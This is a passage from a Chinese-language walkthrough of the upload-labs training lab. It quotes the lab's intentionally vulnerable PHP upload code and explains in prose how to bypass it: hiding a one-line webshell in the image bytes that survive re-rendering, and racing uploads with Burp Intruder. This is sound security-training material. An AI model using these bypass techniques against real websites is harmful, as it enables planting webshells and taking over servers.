                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>
                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//使用上传的图片生成新的图片</span>
            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                 <span class="token comment">//给新图片指定文件名</span>
                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>
                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>               
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//使用上传的图片生成新的图片</span>
            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//给新图片指定文件名</span>
                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>
                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先上传一张图片，然后将该图片下载下来，对比二进制中的变化部分然后将一句话木马写在未变化的部分</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/201320.png" class title="image">
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/201205.png" class title="image">
<blockquote>
<p><a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p>
</blockquote>
<p>好像这个方法只适用于gif，png和jpg还是其它情况</p>
<h1 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除</p>
<p>因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/210531.png" class title="image">
<h1 id="Pass-19-条件竞争"><a href="#Pass-19-条件竞争" class="headerlink" title="Pass-19 条件竞争"></a>Pass-19 条件竞争</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//index.php</span>
<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./myupload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$imgFileName</span> <span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyUpload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$imgFileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$status_code</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$status_code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token property">cls_upload_dir</span> <span class="token operator">.</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token property">cls_file_rename_to</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件已经被上传，但没有重命名。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> 
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'这个文件不能上传到服务器的临时文件存储目录。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> 
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传失败，上传目录不可写。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> 
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传失败，无法上传该类型文件。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> 
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传失败，上传的文件过大。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> 
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传失败，服务器已经存在相同名称文件。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> 
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件无法上传，文件不能复制到目标目录。'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>      
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'未知错误！'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//myupload.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyUpload</span><span class="token punctuation">&#123;</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token operator">...</span><span class="token operator">...</span> 
  <span class="token keyword">var</span> <span class="token variable">$cls_arr_ext_accepted</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
      <span class="token string double-quoted-string">".doc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".xls"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".pdf"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".zip"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".rar"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".7z"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ppt"</span><span class="token punctuation">,</span>
      <span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".xml"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".tiff"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".png"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">...</span><span class="token operator">...</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token operator">...</span><span class="token operator">...</span>  
  <span class="token comment">/** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/</span>
  <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span> <span class="token variable">$dir</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    
    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">isUploadedFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">setDir</span><span class="token punctuation">(</span> <span class="token variable">$dir</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">checkExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">checkSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// if flag to check if the file exists is set to 1</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cls_file_exists</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      
      <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">checkFileExists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// if we are here, we are ready to move the file to destination</span>

    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// check if we need to rename the file</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cls_rename_file</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">renameFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token variable">$ret</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// if we are here, everything worked as planned :)</span>

    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">resultUpload</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"SUCCESS"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token punctuation">&#125;</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token operator">...</span><span class="token operator">...</span> 
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/213551.png" class title="image">
<h1 id="Pass-20-00截断"><a href="#Pass-20-00截断" class="headerlink" title="Pass-20 00截断"></a>Pass-20 00截断</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
